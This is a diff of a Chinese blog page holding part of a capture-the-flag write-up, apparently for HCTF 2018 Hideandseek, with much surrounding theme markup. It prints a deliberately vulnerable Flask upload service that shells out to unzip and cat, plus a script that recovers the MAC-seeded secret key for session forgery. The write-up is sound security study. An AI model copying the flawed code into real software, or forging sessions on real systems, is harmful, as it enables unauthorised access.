class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,session,render_template,redirect, url_for, escape, request,Response</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">100</span>)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;./uploads&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = <span class="built_in">set</span>([<span class="string">&#x27;zip&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span>(<span class="params">filename</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    error = request.args.get(<span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(error == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">        session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, forbidden=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, user=session[<span class="string">&#x27;username&#x27;</span>], flag=flag.flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    username=request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    password=request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> username != <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> password != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span>(username == <span class="string">&#x27;admin&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>,error=<span class="number">1</span>))</span><br><span class="line">        session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span>():</span></span><br><span class="line">    session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;the_file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    file = request.files[<span class="string">&#x27;the_file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;This file already exists&#x27;</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;This file is not a zipfile&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        extract_path = file_save_path + <span class="string">&#x27;_&#x27;</span></span><br><span class="line">        os.system(<span class="string">&#x27;unzip -n &#x27;</span> + file_save_path + <span class="string">&#x27; -d &#x27;</span>+ extract_path)</span><br><span class="line">        read_obj = os.popen(<span class="string">&#x27;cat &#x27;</span> + extract_path + <span class="string">&#x27;/*&#x27;</span>)</span><br><span class="line">        file = read_obj.read()</span><br><span class="line">        read_obj.close()</span><br><span class="line">        os.system(<span class="string">&#x27;rm -rf &#x27;</span> + extract_path)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        file = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">if</span>(file != <span class="literal">None</span>):</span><br><span class="line">        <span class="keyword">if</span>(file.find(base64.b64decode(<span class="string">&#x27;aGN0Zg==&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)) != -<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>, error=<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> Response(file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#app.run(debug=True)</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">10008</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>看代码读一下随机数的种子</p>
-<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">mac = <span class="string">&quot;0e:48:30:60:37:27&quot;</span></span><br><span class="line">temp = mac.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">temp = [<span class="built_in">int</span>(i,<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> temp]</span><br><span class="line">temp = [<span class="built_in">bin</span>(i).replace(<span class="string">&#x27;0b&#x27;</span>,<span class="string">&#x27;&#x27;</span>).zfill(<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> temp]</span><br><span class="line">temp = <span class="string">&#x27;&#x27;</span>.join(temp)</span><br><span class="line">mac = <span class="built_in">int</span>(temp,<span class="number">2</span>)</span><br><span class="line">random.seed(mac)</span><br><span class="line">randStr = <span class="built_in">str</span>(random.random()*<span class="number">100</span>)</span><br><span class="line"><span class="built_in">print</span>(randStr)<span class="comment">#69.83331307187989</span></span><br></pre></td></tr></table></div></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">mac = <span class="string">&quot;0e:48:30:60:37:27&quot;</span></span><br><span class="line">temp = mac.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">temp = [<span class="built_in">int</span>(i,<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> temp]</span><br><span class="line">temp = [<span class="built_in">bin</span>(i).replace(<span class="string">&#x27;0b&#x27;</span>,<span class="string">&#x27;&#x27;</span>).zfill(<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> temp]</span><br><span class="line">temp = <span class="string">&#x27;&#x27;</span>.join(temp)</span><br><span class="line">mac = <span class="built_in">int</span>(temp,<span class="number">2</span>)</span><br><span class="line">random.seed(mac)</span><br><span class="line">randStr = <span class="built_in">str</span>(random.random()*<span class="number">100</span>)</span><br><span class="line"><span class="built_in">print</span>(randStr)<span class="comment">#69.83331307187989</span></span><br></pre></td></tr></table></figure>
 
 <p>剩下就是伪造拿flag</p>
-<script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css"></div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="http://jlan.darkflow.top">Jlan</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="http://jlan.darkflow.top/posts/560a0a51.html">http://jlan.darkflow.top/posts/560a0a51.html</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/posts/efe011ec.html"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">CTFshowJava</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/posts/b1d79a49.html"><span class="paginator-prev__text">Ethernaut记录</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div><div class="comments" id="comments"><div id="valine-container"></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-Roamphp2-Myblog"><span class="toc-number">1.</span> <span class="toc-text">
-          [极客大挑战 2020]Roamphp2-Myblog</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Think-Java"><span class="toc-number">2.</span> <span class="toc-text">
-          [网鼎杯 2020 朱雀组]Think Java</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GKCTF-2021-babycat"><span class="toc-number">3.</span> <span class="toc-text">
-          [GKCTF 2021]babycat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HarekazeCTF2019-Sqlite-Voting"><span class="toc-number">4.</span> <span class="toc-text">
-          [HarekazeCTF2019]Sqlite Voting</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-filejava"><span class="toc-number">5.</span> <span class="toc-text">
-          [网鼎杯 2020 青龙组]filejava</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HXBCTF-2021-easywill"><span class="toc-number">6.</span> <span class="toc-text">
-          [HXBCTF 2021]easywill</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-EasySer"><span class="toc-number">7.</span> <span class="toc-text">
-          [羊城杯 2020]EasySer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JMCTF-2021-UploadHub"><span class="toc-number">8.</span> <span class="toc-text">
-          [JMCTF 2021]UploadHub</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-JavaWeb"><span class="toc-number">9.</span> <span class="toc-text">
-          [红明谷CTF 2021]JavaWeb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HCTF-2018-Hideandseek"><span class="toc-number">10.</span> <span class="toc-text">
-          [HCTF 2018]Hideandseek</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/head.png" alt="avatar"></div><p class="sidebar-ov-author__text">生命不息，折腾不止！</p></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/zhisenyu" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a><a class="sidebar-ov-social-item" href="https://www.youtube.com/channel/UCarZXyGTzWssmNANey0TC3g" target="_blank" rel="noopener" data-popover="Youtube" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-youtube"></i></span></a><a class="sidebar-ov-social-item" href="z405454586" target="_blank" rel="noopener" data-popover="微信" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-weixin"></i></span></a><a class="sidebar-ov-social-item" href="tencent://message?uin=405454586" target="_blank" rel="noopener" data-popover="QQ" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-qq"></i></span></a></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">56</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">10</div><div class="sidebar-ov-state-item__name">标签</div></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Jlan</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v6.0.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div><div class="busuanzi"><span class="busuanzi-siteuv"><span class="busuanzi-siteuv__icon"><i class="fas fa-user"></i></span><span class="busuanzi-siteuv__info">访问人数</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_uv"></span></span><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">浏览总量</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div><div>已经是Dest0g3的菜狗了</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1.0.1/dist/canvas-nest.min.js" color="0,0,0" opacity="0.6" count="150" zIndex="-1"></script><script>function initSearch() {
-  var isXML = true;
-  var search_path = 'search.json';
+<script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">
+                
+            </div>
+            <hr/>
 
-  if (!search_path) {
-    search_path = 'search.xml';
-  } else if (/json$/i.test(search_path)) {
-    isXML = false;
-  }
+            
 
-  var path = '/' + search_path;
-  $.ajax({
-    url: path,
-    dataType: isXML ? 'xml' : 'json',
-    async: true,
-    success: function (res) {
-      var datas = isXML ? $('entry', res).map(function () {
-        // 将 XML 转为 JSON
-        return {
-          title: $('title', this).text(),
-          content: $('content', this).text(),
-          url: $('url', this).text()
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Jlan</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://jlan.darkflow.top/posts/560a0a51.html">http://jlan.darkflow.top/posts/560a0a51.html</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Jlan</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/posts/efe011ec.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="CTFshowJava">
+                        
+                        <span class="card-title">CTFshowJava</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-08-29
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Jlan
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/posts/b1d79a49.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="Ethernaut记录">
+                        
+                        <span class="card-title">Ethernaut记录</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-08-22
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Jlan
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
         };
-      }).get() : res;
-      var $input = $('.search-input input');
-      var $result = $('.search-results');
-      // 搜索对象（标题、内容）的权重，影响显示顺序
-      var WEIGHT = { title: 100, content: 1 };
-      var searchPost = function () {
-        var searchText = $input.val().toLowerCase().trim();
-        // 根据空白字符分隔关键字
-        var keywords = searchText.split(/[\s]+/);
-        // 搜索结果
-        var matchPosts = [];
 
-        // 有多个关键字时，将原文字整个保存下来
-        if (keywords.length > 1) {
-          keywords.push(searchText);
-        }
-        // 防止未输入字符时搜索
-        if (searchText.length > 0) {
-          datas.forEach(function (data) {
-            var isMatch  = false;
-            // 没有标题的文章使用预设的 i18n 变量代替
-            var title = (data.title && data.title.trim()) || '[ 文章无标题 ]';
-            var titleLower = title && title.toLowerCase();
-            // 删除 HTML 标签 和 所有空白字符
-            var content = data.content && data.content.replace(/<[^>]+>/g, '');
-            var contentLower = content && content.toLowerCase();
-            // 删除重复的 /
-            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
-            // 标题中匹配到的关键词
-            var titleHitSlice = [];
-            // 内容中匹配到的关键词
-            var contentHitSlice = [];
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
 
-            keywords.forEach(function (keyword) {
-              /**
-              * 获取匹配的关键词的索引
-              * @param {String} keyword 要匹配的关键字
-              * @param {String} text 原文字
-              * @param {Boolean} caseSensitive 是否区分大小写
-              * @param {Number} weight 匹配对象的权重。权重大的优先显示
-              * @return {Array}
-              */
-              function getIndexByword (word, text, caseSensitive, weight) {
-                if (!word || !text) {
-                  return [];
-                };
+    
 
-                var startIndex = 0; // 每次匹配的开始索引
-                var index = -1;     // 匹配到的索引值
-                var result = [];    // 匹配结果
+</main>
 
-                if (!caseSensitive) {
-                  word = word.toLowerCase();
-                  text = text.toLowerCase();
-                }
 
-                while((index = text.indexOf(word, startIndex)) !== -1) {
-                  var hasMatch = false;
-                  // 索引位置相同的关键词，保留长度较长的
-                  titleHitSlice.forEach(function (hit) {
-                    if (hit.index === index && hit.word.length < word.length) {
-                      hit.word = word;
-                      hasMatch = true;
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
